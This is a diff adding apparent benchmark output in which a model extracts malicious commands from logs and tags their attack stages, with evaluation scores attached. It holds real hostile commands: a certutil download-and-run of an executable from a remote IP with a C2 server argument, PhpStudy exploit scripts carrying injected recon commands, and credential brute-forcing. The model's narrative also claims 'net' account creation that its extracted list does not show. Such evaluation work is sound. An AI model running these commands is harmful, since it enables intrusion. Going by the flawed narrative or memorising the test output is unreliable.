@@ -1,0 +1,88 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "pyhon PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \\\"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\\\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Collection"
+      },
+      {
+        "command": "netstat -ano | findstr 88",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attacker gains initial access through using `certutil` to download an executable (`sangforcat.exe`) from a suspicious URL and execute it. The threat actor uses `taskkill` and `tasklist` commands to terminate and enumerate processes on the compromised machine. Additionally, they use PowerShell scripts to collect information such as IP address and port usage.`WinBrute.exe`, suggests credential access and brute-force attacks. These actions suggest an attempt to gain persistence by using `net` commands to create new accounts.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16543,
+      "completion_tokens": 549,
+      "total_tokens": 17092,
+      "wall_clock_s": 19.075,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.36363636363636365,
+      "recall": 0.5714285714285714,
+      "f1": 0.4444444444444444,
+      "tp": 4,
+      "fp": 7,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.18181818181818182,
+      "recall": 0.3333333333333333,
+      "f1": 0.23529411764705885,
+      "tp": 2,
+      "fp": 9,
+      "fn": 4,
+      "recall_partial": 0.4166666666666667
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16543,
+      "completion_tokens": 549,
+      "total_tokens": 17092,
+      "wall_clock_s": 19.075,
+      "parse_retries": 0
+    }
+  }
+}
